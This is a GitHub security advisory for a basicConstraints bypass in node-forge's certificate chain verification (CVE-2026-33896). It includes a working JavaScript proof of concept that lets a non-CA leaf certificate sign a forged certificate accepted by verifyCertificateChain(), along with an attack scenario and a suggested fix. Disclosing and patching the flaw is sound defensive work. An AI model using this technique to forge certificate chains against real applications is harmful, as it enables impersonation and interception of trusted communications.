# [H] Forge has a basicConstraints bypass in its certificate chain verification (RFC 5280 violation)

## Summary
Severity: High
Advisory: GHSA-2328-f5f3-gj25
CVE: CVE-2026-33896
CWE: CWE-295
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-26
Source: https://github.com/advisories/GHSA-2328-f5f3-gj25
Type: github-advisory

## Affected
- npm: `node-forge` — affected >=0 <1.4.0

## Details
## Summary

`pki.verifyCertificateChain()` does not enforce RFC 5280 basicConstraints requirements when an intermediate certificate lacks both the `basicConstraints` and `keyUsage` extensions. This allows any leaf certificate (without these extensions) to act as a CA and sign other certificates, which node-forge will accept as valid.

## Technical Details

In `lib/x509.js`, the `verifyCertificateChain()` function (around lines 3147-3199) has two conditional checks for CA authorization:

1. The `keyUsage` check (which includes a sub-check requiring `basicConstraints` to be present) is gated on `keyUsageExt !== null`
2. The `basicConstraints.cA` check is gated on `bcExt !== null`

When a certificate has **neither** extension, both checks are skipped entirely. The certificate passes all CA validation and is accepted as a valid intermediate CA.

**RFC 5280 Section 6.1.4 step (k) requires:**
> "If certificate i is a version 3 certificate, verify that the basicConstraints extension is present and that cA is set to TRUE."

The absence of `basicConstraints` should result in rejection, not acceptance.

## Proof of Concept

```javascript
const forge = require('node-forge');
const pki = forge.pki;

function generateKeyPair() {
  return pki.rsa.generateKeyPair({ bits: 2048, e: 0x10001 });
}

console.log('=== node-forge basicConstraints Bypass PoC ===\n');

// 1. Create a legitimate Root CA (self-signed, with basicConstraints cA=true)
const rootKeys = generateKeyPair();
const rootCert = pki.createCertificate();
rootCert.publicKey = rootKeys.publicKey;
rootCert.serialNumber = '01';
rootCert.validity.notBefore = new Date();
rootCert.validity.notAfter = new Date();
rootCert.validity.notAfter.setFullYear(rootCert.validity.notBefore.getFullYear() + 10);

const rootAttrs = [
  { name: 'commonName', value: 'Legitimate Root CA' },
  { name: 'organizationName', value: 'PoC Security Test' }
];
rootCert.setSubject(rootAttrs);
rootCert.setIssuer(rootAttrs);
rootCert.setExtensions([
  { name: 'basicConstraints', cA: true, critical: true },
  { name: 'keyUsage', keyCertSign: true, cRLSign: true, critical: true }
]);
rootCert.sign(rootKeys.privateKey, forge.md.sha256.create());

// 2. Create a "leaf" certificate signed by root — NO basicConstraints, NO keyUsage
//    This certificate should NOT be allowed to sign other certificates
const leafKeys = generateKeyPair();
const leafCert = pki.createCertificate();
leafCert.publicKey = leafKeys.publicKey;
leafCert.serialNumber = '02';
leafCert.validity.notBefore = new Date();
leafCert.validity.notAfter = new Date();
leafCert.validity.notAfter.setFullYear(leafCert.validity.notBefore.getFullYear() + 5);

const leafAttrs = [
  { name: 'commonName', value: 'Non-CA Leaf Certificate' },
  { name: 'organizationName', value: 'PoC Security Test' }
];
leafCert.setSubject(leafAttrs);
leafCert.setIssuer(rootAttrs);
// NO basicConstraints extension — NO keyUsage extension
leafCert.sign(rootKeys.privateKey, forge.md.sha256.create());

// 3. Create a "victim" certificate signed by the leaf
//    This simulates an attacker using a non-CA cert to forge certificates
const victimKeys = generateKeyPair();
const victimCert = pki.createCertificate();
victimCert.publicKey = victimKeys.publicKey;
victimCert.serialNumber = '03';
victimCert.validity.notBefore = new Date();
victimCert.validity.notAfter = new Date();
victimCert.validity.notAfter.setFullYear(victimCert.validity.notBefore.getFullYear() + 1);

const victimAttrs = [
  { name: 'commonName', value: 'victim.example.com' },
  { name: 'organizationName', value: 'Victim Corp' }
];
victimCert.setSubject(victimAttrs);
victimCert.setIssuer(leafAttrs);
victimCert.sign(leafKeys.privateKey, forge.md.sha256.create());

// 4. Verify the chain: root -> leaf -> victim
const caStore = pki.createCaStore([rootCert]);

try {
  const result = pki.verifyCertificateChain(caStore, [victimCert, leafCert]);
  console.log('[VULNERABLE] Chain verification SUCCEEDED: ' + result);
  console.log('  node-forge accepted a non-CA certificate as an intermediate CA!');
  console.log('  This violates RFC 5280 Section 6.1.4.');
} catch (e) {
  console.log('[SECURE] Chain verification FAILED (expected): ' + e.message);
}
```

**Results:**
- Certificate with NO extensions: **ACCEPTED as CA** (vulnerable — violates RFC 5280)
- Certificate with `basicConstraints.cA=false`: correctly rejected
- Certificate with `keyUsage` (no `keyCertSign`): correctly rejected
- Proper intermediate CA (control): correctly accepted

## Attack Scenario

An attacker who obtains any valid leaf certificate (e.g., a regular TLS certificate for `attacker.com`) that lacks `basicConstraints` and `keyUsage` extensions can use it to sign certificates for ANY domain. Any application using node-forge's `verifyCertificateChain()` will accept the forged chain.

This affects applications using node-forge for:
- Custom PKI / certificate pinning implementations
- S/MIME / PKCS#7 signature verification
- IoT device certificate validation
- Any non-native-TLS certificate chain verification

## CVE Precedent

This is the same vulnerability class as:
- **CVE-2014-0092** (GnuTLS) — certificate verification bypass
- **CVE-2015-1793** (OpenSSL) — alternative chain verification bypass
- **CVE-2020-0601** (Windows CryptoAPI) — crafted certificate acceptance

## Not a Duplicate

This is distinct from:
- CVE-2025-12816 (ASN.1 parser desynchronization — different code path)
- CVE-2025-66030/66031 (DoS and integer overflow — different issue class)
- GitHub issue #1049 (null subject/issuer — different malformation)

## Suggested Fix

Add an explicit check for absent `basicConstraints` on non-leaf certificates:

```javascript
// After the keyUsage check block, BEFORE the cA check:
if(error === null && bcExt === null) {
  error = {
    message: 'Certificate is missing basicConstraints extension and cannot be used as a CA.',
    error: pki.certificateError.bad_certificate
  };
}
```

## Disclosure Timeline

- 2026-03-10: Report submitted via GitHub Security Advisory
- 2026-06-08: 90-day coordinated disclosure deadline

## Credits

Discovered and reported by Doruk Tan Ozturk ([@peaktwilight](https://github.com/peaktwilight)) — [doruk.ch](https://doruk.ch)

## References
- https://github.com/digitalbazaar/forge/security/advisories/GHSA-2328-f5f3-gj25
- https://nvd.nist.gov/vuln/detail/CVE-2026-33896
- https://github.com/digitalbazaar/forge/commit/2e492832fb25227e6b647cbe1ac981c123171e90
- https://github.com/digitalbazaar/forge
